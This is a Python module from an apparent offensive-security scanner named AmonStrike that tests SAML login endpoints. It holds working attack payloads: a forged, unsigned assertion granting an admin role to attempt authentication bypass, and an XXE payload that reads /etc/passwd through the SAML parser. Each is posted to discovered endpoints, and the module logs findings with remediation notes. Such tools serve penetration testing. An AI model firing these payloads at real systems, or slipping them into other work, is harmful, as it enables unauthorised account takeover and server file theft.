"""AmonStrike — SAML Security Module"""
import re, base64
from .base import BaseModule

class SamlBypassModule(BaseModule):
    NAME        = "saml_bypass"
    DESCRIPTION = "SAML — signature wrapping, XXE, algorithm confusion"

    def run(self):
        self.log("Testing SAML security...")
        endpoints = self._find_saml_endpoints()
        for ep in endpoints:
            self._test_xml_signature_bypass(ep)
            self._test_xxe_in_saml(ep)
        self._check_saml_config()
        return self.result()

    def _find_saml_endpoints(self) -> list:
        endpoints = []
        for path in ["/saml","/sso","/saml/acs","/saml2/acs",
                     "/auth/saml","/api/sso","/saml/metadata"]:
            r = self.get(path)
            if r and r.status_code not in [404,405]:
                endpoints.append(self.url+path)
        return endpoints

    def _test_xml_signature_bypass(self, endpoint: str):
        """XML Signature Wrapping attack."""
        forged_saml = base64.b64encode(b"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>admin@target.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>""").decode()
        r = self.post(endpoint, data={"SAMLResponse": forged_saml})
        if r and r.status_code in [200,302]:
            if any(w in r.text.lower() for w in ["admin","dashboard","welcome","token","session"]):
                self.add_finding(
                    title       = "SAML Signature Bypass — Forged Assertion Accepted",
                    severity    = "CRITICAL",
                    description = "SAML endpoint accepted unsigned/forged assertion. Full authentication bypass.",
                    evidence    = f"Endpoint: {endpoint}\nForged role: admin\nResponse: {r.text[:200]}",
                    remediation = "Validate SAML signature on every assertion. Reject unsigned responses.",
                    url=endpoint, cve="CVE-2017-11427",
                )

    def _test_xxe_in_saml(self, endpoint: str):
        """XXE injection inside SAML assertion."""
        xxe_saml = base64.b64encode(b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>""").decode()
        r = self.post(endpoint, data={"SAMLResponse": xxe_saml})
        if r and "root:x" in r.text:
            self.add_finding(
                title       = "XXE in SAML Endpoint — File Read via Assertion",
                severity    = "CRITICAL",
                description = "XXE injection via SAML assertion reads /etc/passwd.",
                evidence    = f"Endpoint: {endpoint}\n/etc/passwd in response: {r.text[:300]}",
                remediation = "Disable XML external entity processing in SAML parser. Use defusedxml.",
                url=endpoint, cve="CWE-611",
            )

    def _check_saml_config(self):
        """Check for exposed SAML metadata."""
        for path in ["/saml/metadata","/sso/metadata","/auth/saml/metadata"]:
            r = self.get(path)
            if r and r.status_code == 200 and "EntityDescriptor" in r.text:
                self.add_finding(
                    title       = f"SAML Metadata Exposed: {path}",
                    severity    = "LOW",
                    description = "SAML metadata reveals IdP certificates, entity IDs, and endpoint URLs.",
                    evidence    = f"Path: {path}\nPreview: {r.text[:200]}",
                    remediation = "Restrict metadata access to authorized IdPs only.",
                    url=self.url+path, cve="CWE-200",
                )
